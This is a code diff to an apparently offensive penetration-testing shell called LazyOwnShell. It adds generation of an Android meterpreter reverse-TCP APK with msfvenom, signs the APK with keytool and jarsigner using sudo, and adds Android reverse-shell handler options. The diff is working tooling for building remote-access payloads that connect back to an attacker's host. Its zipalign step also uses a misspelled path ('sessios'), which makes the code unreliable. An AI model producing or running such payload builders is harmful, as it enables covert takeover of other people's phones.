@@ -1729,7 +1729,8 @@ class LazyOwnShell(Cmd):
         print_msg("12: osx/x64/shell_reverse_tcp")
         print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
         print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
-        choice = input("Enter your choice (1-14): ").strip()
+        print_msg("15: android/meterpreter/reverse_tcp")
+        choice = input("Enter your choice (1-15): ").strip()
 
         # Define payload commands
         commands = {
@@ -1752,6 +1753,7 @@ class LazyOwnShell(Cmd):
             "14": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
             ),
+            "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
         }
 
         # Check if the choice is valid
@@ -1764,6 +1766,17 @@ class LazyOwnShell(Cmd):
                 print_warn("codificando payload shell_encoded.exe ")
             os.system(commands[choice])
             print_msg(f"Generated payload: {commands[choice]}")
+            if choice == '15':
+                os.system("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
+                if not is_binary_present("jarsigner"):
+                    print_warn("jarsigner is not present in the system, installing...")
+                    os.system("sudo apt-get install openjdk-11-jdk-headless")
+                os.system("sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi")
+                os.system("sudo jarsigner -verify -verbose -certs sessions/shell.apk")
+                if not is_binary_present("zipalign"):
+                    print_warn("zipalign is not presetn in the system, installing...")
+                    os.system("sudo apt-get install zipalign")
+                os.system("zipalign -v 4 sessios/shell.apk signed_shell.apk")
 
             # Move and set permissions for the generated payload
             if choice in commands:
@@ -7163,7 +7176,7 @@ class LazyOwnShell(Cmd):
             if len(args) == 1:
                 setpayload = "windows/meterpreter/reverse_tcp"
             elif len(args) == 2:
-                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64"]:
+                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64", "android"]:
                     print_msg("Select payload type:")
                     print_msg("1: With meterpreter")
                     print_msg("2: Without meterpreter")
@@ -7217,7 +7230,14 @@ class LazyOwnShell(Cmd):
                         else:
                             print_error("Invalid choice")
                             return
-
+                    elif args[1] == "android":
+                        if choice == "1":
+                            setpayload = "android/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "android/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
                     print_msg(f"Selected payload: {setpayload}")
 
                     
